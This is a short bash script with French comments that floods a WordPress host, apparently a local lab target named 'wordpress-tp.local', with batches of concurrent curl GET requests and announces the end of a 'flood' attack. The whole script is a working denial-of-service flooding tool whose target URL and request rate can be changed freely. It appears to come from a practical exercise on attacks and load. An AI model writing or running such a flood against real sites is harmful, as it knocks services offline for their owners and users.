#!/bin/bash

# URL cible à tester
TARGET_URL="http://wordpress-tp.local:31337/"

# Nombre de requêtes par seconde (peut être ajusté)
 REQUESTS_PER_SECOND=20000
# REQUESTS_PER_SECOND=200
# Nombre d'itérations (ou requêtes) à envoyer
 TOTAL_REQUESTS=2000
# TOTAL_REQUESTS=200

# Fonction pour effectuer une requête GET via curl
flood_request() {
    # Afficher la date et l'heure à chaque requête
    echo "$(date '+%Y-%m-%d %H:%M:%S') - Envoi requête à $TARGET_URL"
    
    # Envoyer la requête GET et afficher le code HTTP
    curl -s -o /dev/null -w "%{http_code}\n" "$TARGET_URL"
}

# Effectuer une boucle infinie avec les requêtes à un rythme de "REQUESTS_PER_SECOND"
# Nous ajoutons un délai pour simuler une charge continue
for ((i=1; i<=TOTAL_REQUESTS; i++))
do
    flood_request &
    
    # Attendre entre chaque groupe de requêtes pour maintenir le taux
    if (( i % REQUESTS_PER_SECOND == 0 )); then
        wait # Attend que toutes les requêtes de ce groupe soient terminées avant de lancer une autre série
    fi
done

echo "Fin de l'attaque de type flood sur $TARGET_URL"
